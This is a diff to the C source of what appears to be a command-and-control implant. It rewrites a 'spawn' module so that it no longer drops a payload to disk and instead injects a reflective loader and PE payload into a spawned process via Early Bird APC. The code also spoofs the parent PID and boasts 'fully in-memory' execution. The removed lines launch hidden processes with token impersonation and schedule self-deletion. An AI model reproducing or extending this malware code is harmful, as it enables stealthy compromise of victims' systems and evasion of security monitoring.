@@ -7,6 +7,8 @@
  */
 #include "agent.h"
 #include "api_resolve.h"
+#include "inject.h"
+#include "loader_bin.h"
 
 /* Helper: buf_append a string literal with auto-length */
 #define BUF_STR(buf, s) buf_append(buf, s, (DWORD)(sizeof(s) - 1))
@@ -2100,211 +2102,108 @@ void mod_spawn(Buffer *out, const unsigned char *args, DWORD args_len) {
     char spawnto_expanded[MAX_PATH];
     ExpandEnvironmentStringsA(spawnto_raw, spawnto_expanded, MAX_PATH);
 
-    snprintf(msg, sizeof(msg), "[*] Spawn %s via %s\n", arch_str, spawnto_expanded);
+    snprintf(msg, sizeof(msg), "[*] Spawn %s via %s (Early Bird APC)\n",
+             arch_str, spawnto_expanded);
     buf_append(out, msg, (DWORD)strlen(msg));
     if (_spawn_ppid != 0) {
         snprintf(msg, sizeof(msg), "[*] PPID spoofing: %lu\n", _spawn_ppid);
         buf_append(out, msg, (DWORD)strlen(msg));
     }
 
-    /* 1. Write payload to temp file */
-    char tempDir[MAX_PATH];
-    GetTempPathA(MAX_PATH, tempDir);
+    /*
+     * Build injection buffer:
+     *   [0x00] E9 xx xx xx xx   jmp to loader code (skip header)
+     *   [0x05] 00 00 00         padding
+     *   [0x08] DWORD pe_offset  offset from start to PE payload
+     *   [0x0C] DWORD pe_size    PE payload size
+     *   [0x10] loader shellcode (REFLECTIVE_LOADER_SIZE bytes)
+     *   [pe_offset] PE payload  (payload_len bytes)
+     */
+    #define SPAWN_HEADER_SIZE 16
 
-    char rname[9];
-    _jump_randname(rname, 8);
+    /* Check that we have a real loader compiled */
+#if defined(REFLECTIVE_LOADER_READY) && REFLECTIVE_LOADER_READY == 0
+    BUF_STR(out, "[-] Reflective loader not compiled!\n");
+    BUF_STR(out, "[-] Run: ./scripts/compile_loader.sh\n");
+    return;
+#endif
 
-    char tempPath[MAX_PATH];
-    snprintf(tempPath, sizeof(tempPath), "%s%s.exe", tempDir, rname);
+    DWORD loader_size = (DWORD)REFLECTIVE_LOADER_SIZE;
+    DWORD pe_offset   = SPAWN_HEADER_SIZE + loader_size;
+    /* Align PE to 16 bytes */
+    pe_offset = (pe_offset + 15) & ~15u;
 
-    HANDLE hFile = CreateFileA(tempPath, GENERIC_WRITE, 0,
-                                NULL, CREATE_ALWAYS,
-                                FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        snprintf(msg, sizeof(msg), "[-] Failed to create temp file: %s (err=%lu)\n",
-                 tempPath, GetLastError());
-        buf_append(out, msg, (DWORD)strlen(msg));
+    DWORD total_size = pe_offset + payload_len;
+
+    unsigned char *inject_buf = (unsigned char *)VirtualAlloc(
+        NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!inject_buf) {
+        BUF_STR(out, "[-] Failed to allocate injection buffer\n");
         return;
     }
+    memset(inject_buf, 0, total_size);
 
-    DWORD written;
-    WriteFile(hFile, payload, payload_len, &written, NULL);
-    CloseHandle(hFile);
+    /* Write header: JMP over header to loader code at 0x10 */
+    inject_buf[0] = 0xE9;  /* jmp rel32 */
+    DWORD jmp_offset = SPAWN_HEADER_SIZE - 5;  /* relative to end of jmp insn */
+    memcpy(inject_buf + 1, &jmp_offset, 4);
 
-    if (written != payload_len) {
-        snprintf(msg, sizeof(msg), "[-] Incomplete write (%lu/%lu bytes)\n", written, payload_len);
-        buf_append(out, msg, (DWORD)strlen(msg));
-        DeleteFileA(tempPath);
-        return;
-    }
+    /* PE offset + size at fixed positions */
+    memcpy(inject_buf + 0x08, &pe_offset, 4);
+    memcpy(inject_buf + 0x0C, &payload_len, 4);
 
-    snprintf(msg, sizeof(msg), "[+] Wrote %lu bytes to %s\n", payload_len, tempPath);
+    /* Copy loader shellcode at 0x10 */
+    memcpy(inject_buf + SPAWN_HEADER_SIZE, reflective_loader_bin, loader_size);
+
+    /* Copy PE payload at pe_offset */
+    memcpy(inject_buf + pe_offset, payload, payload_len);
+
+    snprintf(msg, sizeof(msg),
+             "[*] Injection buffer: %lu bytes (loader=%lu, PE=%lu)\n",
+             total_size, loader_size, payload_len);
     buf_append(out, msg, (DWORD)strlen(msg));
+    BUF_STR(out, "[*] Technique: Early Bird APC (no file on disk)\n");
 
-    /* 2. Resolve APIs dynamically */
-    HMODULE hK32 = LoadLibraryA("kernel32.dll");
-    fn_InitPTAL pInitPTAL = (fn_InitPTAL)GetProcAddress(hK32,
-        "InitializeProcThreadAttributeList");
-    fn_UpdatePTA pUpdatePTA = (fn_UpdatePTA)GetProcAddress(hK32,
-        "UpdateProcThreadAttribute");
-    fn_DeletePTAL pDeletePTAL = (fn_DeletePTAL)GetProcAddress(hK32,
-        "DeleteProcThreadAttributeList");
-    fn_CreateProcessW_t pCreateProcessW = (fn_CreateProcessW_t)GetProcAddress(hK32,
-        "CreateProcessW");
-
-    if (!pCreateProcessW) {
-        BUF_STR(out, "[-] Failed to resolve CreateProcessW\n");
-        DeleteFileA(tempPath);
-        return;
-    }
-
-    /* 3. Build command line — use the temp payload path as the actual binary,
-     *    but the spawnto path as the "image name" argument in the command line
-     *    so it appears as the spawnto process in task manager argument column. */
-    wchar_t wTempPath[MAX_PATH];
-    MultiByteToWideChar(CP_UTF8, 0, tempPath, -1, wTempPath, MAX_PATH);
-
+    /* Convert spawnto path to wide char for inject API */
     wchar_t wSpawnTo[MAX_PATH];
     MultiByteToWideChar(CP_UTF8, 0, spawnto_expanded, -1, wSpawnTo, MAX_PATH);
 
-    /* Command line: just the binary path (the payload IS the exe) */
-    wchar_t wCmdLine[MAX_PATH + 4];
-    swprintf(wCmdLine, MAX_PATH + 4, L"\"%ls\"", wTempPath);
+    /* Configure injection */
+    INJECT_OPTS opts;
+    memset(&opts, 0, sizeof(opts));
+    opts.technique  = INJECT_EARLY_BIRD;
+    opts.spawnTo    = wSpawnTo;
+    opts.ppidSpoof  = (_spawn_ppid != 0) ? TRUE : FALSE;
+    opts.spoofPid   = _spawn_ppid;
+    opts.blockDlls  = FALSE;
+    opts.waitForCompletion = FALSE;
 
-    PROCESS_INFORMATION pi;
-    memset(&pi, 0, sizeof(pi));
-    BOOL spawned = FALSE;
-    DWORD createFlags = CREATE_NO_WINDOW;
-    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
-    HANDLE hParent = NULL;
+    INJECT_RESULT result;
+    memset(&result, 0, sizeof(result));
 
-    /* 4. PPID spoofing setup (if configured and APIs available) */
-    if (_spawn_ppid != 0 && pInitPTAL && pUpdatePTA && pDeletePTAL) {
-        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, _spawn_ppid);
-        if (!hParent) {
-            snprintf(msg, sizeof(msg),
-                     "[!] Cannot open parent PID %lu (err=%lu), spawning without PPID spoof\n",
-                     _spawn_ppid, GetLastError());
-            buf_append(out, msg, (DWORD)strlen(msg));
-        }
-    }
+    BOOL ok = inject_shellcode(inject_buf, (SIZE_T)total_size, &opts, &result);
 
-    if (hParent) {
-        /* Create with EXTENDED_STARTUPINFO_PRESENT for PPID spoofing */
-        SIZE_T attrSize = 0;
-        pInitPTAL(NULL, 1, 0, &attrSize);
-        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attrSize);
-        if (pAttrList && pInitPTAL(pAttrList, 1, 0, &attrSize)) {
-            /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000 */
-            if (pUpdatePTA(pAttrList, 0,
-                           (DWORD_PTR)0x00020000, /* PROC_THREAD_ATTRIBUTE_PARENT_PROCESS */
-                           &hParent, sizeof(HANDLE), NULL, NULL)) {
+    /* Free local injection buffer immediately */
+    VirtualFree(inject_buf, 0, MEM_RELEASE);
 
-                STARTUPINFOEXW siex;
-                memset(&siex, 0, sizeof(siex));
-                siex.StartupInfo.cb = sizeof(siex);
-                siex.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-                siex.StartupInfo.wShowWindow = SW_HIDE;
-                siex.lpAttributeList = pAttrList;
-
-                createFlags |= EXTENDED_STARTUPINFO_PRESENT;
-
-                spawned = pCreateProcessW(
-                    wTempPath,     /* lpApplicationName — actual binary */
-                    wCmdLine,      /* lpCommandLine */
-                    NULL, NULL,
-                    FALSE,         /* bInheritHandles */
-                    createFlags,
-                    NULL, NULL,
-                    (LPSTARTUPINFOW)&siex, &pi);
-
-                if (spawned) {
-                    snprintf(msg, sizeof(msg), "[+] Spawned with PPID spoof (parent=%lu)\n",
-                             _spawn_ppid);
-                    buf_append(out, msg, (DWORD)strlen(msg));
-                }
-            }
-        }
-    }
-
-    /* 5. Fallback: no PPID spoofing */
-    if (!spawned) {
-        /* Check for impersonation token */
-        HANDLE hThreadToken = NULL;
-        if (OpenThreadToken(GetCurrentThread(),
-                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
-                            FALSE, &hThreadToken)) {
-            HANDLE hPrimary = NULL;
-            if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
-                                 SecurityImpersonation, TokenPrimary, &hPrimary)) {
-                STARTUPINFOW siw;
-                memset(&siw, 0, sizeof(siw));
-                siw.cb = sizeof(siw);
-                siw.dwFlags = STARTF_USESHOWWINDOW;
-                siw.wShowWindow = SW_HIDE;
-
-                spawned = CreateProcessWithTokenW(
-                    hPrimary, 0, wTempPath, wCmdLine,
-                    CREATE_NO_WINDOW, NULL, NULL, &siw, &pi);
-
-                CloseHandle(hPrimary);
-            }
-            CloseHandle(hThreadToken);
-        }
-
-        if (!spawned) {
-            STARTUPINFOW siw;
-            memset(&siw, 0, sizeof(siw));
-            siw.cb = sizeof(siw);
-            siw.dwFlags = STARTF_USESHOWWINDOW;
-            siw.wShowWindow = SW_HIDE;
-
-            spawned = pCreateProcessW(
-                wTempPath, wCmdLine,
-                NULL, NULL, FALSE,
-                CREATE_NO_WINDOW,
-                NULL, NULL,
-                &siw, &pi);
-        }
-    }
-
-    /* 6. Cleanup PPID spoofing resources */
-    if (pAttrList) {
-        pDeletePTAL(pAttrList);
-        free(pAttrList);
-    }
-    if (hParent) CloseHandle(hParent);
-
-    if (!spawned) {
-        DWORD err = GetLastError();
-        snprintf(msg, sizeof(msg), "[-] CreateProcess failed (err=%lu)\n", err);
+    if (!ok) {
+        snprintf(msg, sizeof(msg), "[-] Injection failed: %s (err=0x%08lX)\n",
+                 result.errorMsg, result.lastError);
         buf_append(out, msg, (DWORD)strlen(msg));
-        DeleteFileA(tempPath);
         return;
     }
 
-    snprintf(msg, sizeof(msg), "[+] Spawned process PID %lu (TID %lu)\n",
-             pi.dwProcessId, pi.dwThreadId);
+    /* Get PID from the process handle */
+    DWORD childPid = GetProcessId(result.hProcess);
+    snprintf(msg, sizeof(msg), "[+] Injected into PID %lu (%s)\n",
+             childPid, spawnto_expanded);
     buf_append(out, msg, (DWORD)strlen(msg));
 
-    /* 7. Wait briefly for the child to read the binary, then delete from disk */
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+    /* Cleanup handles — the child runs independently */
+    if (result.hThread)  CloseHandle(result.hThread);
+    if (result.hProcess) CloseHandle(result.hProcess);
 
-    /* Sleep a moment to let the child load — then try to delete.
-     * If the file is still locked, schedule deletion on reboot via MoveFileEx. */
-    Sleep(3000);
-    if (!DeleteFileA(tempPath)) {
-        /* Schedule delete on reboot (MOVEFILE_DELAY_UNTIL_REBOOT) */
-        wchar_t wTemp[MAX_PATH];
-        MultiByteToWideChar(CP_UTF8, 0, tempPath, -1, wTemp, MAX_PATH);
-        MoveFileExW(wTemp, NULL, 4 /* MOVEFILE_DELAY_UNTIL_REBOOT */);
-        snprintf(msg, sizeof(msg), "[*] Temp file locked — scheduled for deletion on reboot\n");
-        buf_append(out, msg, (DWORD)strlen(msg));
-    } else {
-        BUF_STR(out, "[+] Temp file cleaned up\n");
-    }
-
+    BUF_STR(out, "[+] No file on disk — fully in-memory\n");
     BUF_STR(out, "[+] New beacon should check in shortly\n");
 }
 
